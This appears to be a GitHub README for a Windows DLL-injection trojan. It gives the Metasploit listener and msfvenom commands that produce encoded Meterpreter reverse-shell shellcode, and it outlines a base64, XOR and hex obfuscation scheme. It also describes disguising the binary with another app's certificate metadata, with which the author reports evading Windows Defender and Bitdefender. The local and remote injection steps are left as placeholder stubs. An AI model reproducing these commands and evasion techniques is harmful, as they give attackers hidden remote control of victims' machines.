# Remote Dll injector Trojan
Trojan using dll injection of a custom library that spawns a shell on a target machine, undetected by Windows defender and Bitdefener

# 💻 Code

<img align="right" src="media/a1.png" width="440" />

This malware injects a malicious library into a target process or directly creates a process and uploads the library into it, the dll contains a simple encoded base64 data that spawns a reverse shell.

### 0) Listener

- First i used the classic multi handler exploit to run the payload: 
``` msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost XXX; set lport XXX; exploit" ```

- The payload is a simple base64 shellcode, it's reccomended to use shigata_ga_nai alternatives since its easy to detect:
``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=XXX LPORT=XXXX  -e x86/shikata_ga_nai -f c  ```. 

### 0.1) Encrypter:

- First we encode binary data into Base64, try to use a custom base64_chars set instead of the standard Base64 alphabet to obfuscate more;
- Secondly we apply XOR encryption using a single-byte key; 
- Then we convert it into its hexadecimal string representation and we get the final encrypted shellcode.

### 1) DLL
The malicious library contains 4 different call cases, process attach/detach, and thread create/delete, the best one is in my opinion the first one. When the library is attached to the process, it decodes the base64 encoded data and uploads it to memory. Once uploaded, the data holding the shellcode will start the reverse shell with the attacker machine.  

### 2) Local Injection

The local injection takes the dynamic library which is already located into the disk (basically useless, just a sample), creates a process and injects the library into it. Here is a detailed explanation: 

- aaa
- bbb
- ccc

### 3) Remote Injection

The remote injection dumps the dynamic library into disk (might get detected tho as anything that gets written into disk is automathically scanned by the antivirus), looks for a specific process and injects the library into it. Here is a detailed explanation: 

- aaa 
- bbb
- ccc


# 🛡 Obfuscation and AV Detection 

<img align="right" src="media/av1.png" width="340" />

Both coes are undetected by Windows defender, but the local injection is detected by 10 antiviruses. Using a simple certificate and metadata manager like Process Hacker (free an open source) i uploaded the data of a common app (in my case it was github desktop setup) and the AVs went from 10 to 1 in an instant, and for the first time Bitdefender didn't flag it as suspicious 😀!!! The file went from a few kilobytes to like 100mb tho so i think i'll have to work on that, maybe by embedding only the essential metadata and certificates.


<img align="left" src="media/av4.png" width="440" />
